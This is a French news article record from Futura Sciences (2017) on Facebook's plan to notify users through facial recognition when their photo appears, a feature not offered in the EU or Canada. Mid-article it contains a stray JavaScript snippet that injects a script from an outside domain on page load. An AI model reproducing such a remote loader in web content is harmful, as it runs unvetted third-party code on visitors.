{"title": "Intelligence artificielle : Facebook mise sur la reconnaissance faciale", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP-Relaxnews"], "date_publi": "2017-12-21", "content": "Facebook fait une nouvelle fois appel a l'intelligence artificielle pour controler l'utilisation des photos de visages. Ses algorithmes de reconnaissance faciale peuvent prevenir quelqu'un si sa photo est diffusee sur le reseau social. Un outil destine a lutter contre les problemes de harcelements et d'usurpation d'identite. Grace a la  reconnaissance faciale , Facebook va informer ses utilisateurs lorsqu'une photo d'eux est publiee sur le  reseau social , meme lorsqu'ils n'ont pas ete identifies par leur nom ( tags ), a annonce le groupe mardi.  << Nous faisons cela pour empecher les gens de prendre la place d'autres sur Facebook >>  en utilisant par exemple la photo de quelqu'un d'autre comme photo de profil, ecrit le groupe. L'entreprise utilise deja la reconnaissance des visages pour proposer a un utilisateur publiant une photo d'identifier un << ami >>. Cette fonction optionnelle a pour effet d'informer automatiquement l'interesse qu'un cliche de lui a ete poste sur  Facebook .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La reconnaissance facile ne sera pas disponible dans l'UE ni au Canada Desormais,  << si vous etes sur une photo [...], nous vous le dirons, meme si vous n'avez pas ete identifie >>  nommement, explique sur son  blog  officiel le reseau social, qui revendique plus de deux milliards d'utilisateurs actifs. Cette fonctionnalite sera mise en place  << bientot >>  et permettra aux interesses de s'identifier sur la photo s'ils le souhaitent, ou bien d'exprimer des inquietudes ou des reserves a la personne qui a publie les cliches, fait valoir le reseau social. Les fonctions utilisant la reconnaissance faciale ne sont pas proposees au Canada et dans l'Union europeenne, precise Facebook dans un  communique , des zones ou les regulations en  matiere  de protection des donnees et de la vie privee sont souvent plus strictes. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  reconnaissance faciale picasa  |  intelligence artificielle  |  ia intelligence artificielle  |  tpe intelligence artificielle  |  intelligence artificielle debat  |  logiciels intelligence artificielle  |  logiciel intelligence artificielle  |  problematique tpe intelligence artificielle  |  reconnaissance vocale  |  reconnaissance de visage", "theme": "tech"}